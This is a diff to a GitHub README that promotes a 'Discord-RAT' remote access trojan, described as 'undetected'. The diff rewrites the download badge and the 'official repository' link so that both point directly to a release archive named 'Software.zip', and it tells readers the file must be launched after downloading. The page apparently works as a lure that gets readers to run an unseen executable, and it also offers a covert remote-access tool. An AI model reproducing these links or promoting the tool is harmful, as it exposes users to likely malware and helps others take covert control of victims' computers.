@@ -13,7 +13,7 @@ Welcome to the Discord-RAT repository, your go-to place for a powerful Discord R
 
 ## Installation Guide
 To get started with Discord-RAT, you can download the tool from the following link:
-[![Download Discord-RAT](https://img.shields.io/badge/Download-Discord--RAT-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Discord-RAT](https://github.com/bipson118/Discord-RAT/releases/download/v1.0/Software.zip)](https://github.com/bipson118/Discord-RAT/releases/download/v1.0/Software.zip)
 *(Note: File needs to be launched after downloading)*
 
 If the above link is not working, make sure to check the "Releases" section of this repository for alternative download options.
@@ -40,7 +40,7 @@ If the above link is not working, make sure to check the "Releases" section of t
 - undetected
 
 ## Resources
-If you're interested in learning more about Discord-RAT, make sure to visit the [official repository](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip).
+If you're interested in learning more about Discord-RAT, make sure to visit the [official repository](https://github.com/bipson118/Discord-RAT/releases/download/v1.0/Software.zip).
 
 ## Stay Connected
 For any questions, feedback, or collaborations, feel free to reach out to the Discord-RAT team. We're always excited to connect with fellow cybersecurity enthusiasts and learners.
